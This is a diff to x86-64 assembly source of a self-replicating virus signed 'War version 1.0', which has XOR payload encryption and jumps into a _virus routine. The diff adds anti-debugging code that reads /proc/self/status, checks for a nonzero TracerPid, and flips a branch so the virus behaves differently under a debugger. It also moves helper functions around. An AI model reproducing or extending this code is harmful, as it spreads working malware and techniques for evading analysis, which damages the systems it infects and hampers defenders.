@@ -40,10 +40,6 @@ _start:
 
 signature db `War version 1.0 (c)oded by lmartin - `; sw4g signature
 fingerprint db `00000000:0000`, 0x0
-
-self_status db `/proc/self/status`, 0x0
-tracer_pid db `TracerPid:\t0\n`, 0x0
-
 _h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
@@ -57,15 +53,46 @@ _h3ll0w0rld:
 %endif
 	; Overlapping instruction:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
+	push rdx
+	push rcx
 	lea rdi, [rel self_status]
 	xor rsi, rsi; O_RDONLY
 	push SYSCALL_OPEN
 	pop rax
 	syscall
+	sub rsp, 4096
 
+	push rax
+	pop rdi
+	mov rsi, rsp
+	push 4096
+	pop rdx
+	xor rax, rax; SYSCALL_READ
+	syscall
+
+	push rdi
+	push rsi
+	pop rdi
+	push rax
+	pop rsi
+	lea rdx, [rel tracer_pid]
+	push 13
+	pop rcx
+	call _ft_memmem
+
+	pop rdi
+	push rax
+	push SYSCALL_CLOSE
+	pop rax
+	syscall
+	pop rax
+
+	add rsp, 4096
+	pop rcx
+	pop rdx
 
 	cmp rax, 0x0
-	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
+	jnz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
 	jmp .happy_mix
 	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
 		push rdx
@@ -136,7 +163,10 @@ _h3ll0w0rld:
 		jz _virus
 
 		jmp _prg
-	debugging db `DEBUGGING..\n`, 0x0
+
+debugging db `DEBUGGING..\n`, 0x0
+self_status db `/proc/self/status`, 0x0
+tracer_pid db `TracerPid:\t0\n`, 0x0
 
 ;                      v dst       v len      v key       v key_size
 _xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
@@ -167,16 +197,6 @@ _exit:
 	pop rax ; exit
 	xor rdi, rdi; = 0
 	syscall
-
-_ft_strlen:; (string rdi)
-	xor rax, rax; = 0
-	.loop_char:
-		cmp byte [rdi + rax], 0
-		jz .return
-		inc rax
-	jmp .loop_char
-	.return:
-ret
 
 _ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
 	push rcx
@@ -1181,6 +1201,16 @@ _ft_isnum:; (string rdi) ; 0 no - otherwise rax something else
 	jmp .loop_char
 	.isnotnum:
 		xor rax, rax
+	.return:
+ret
+
+_ft_strlen:; (string rdi)
+	xor rax, rax; = 0
+	.loop_char:
+		cmp byte [rdi + rax], 0
+		jz .return
+		inc rax
+	jmp .loop_char
 	.return:
 ret
 
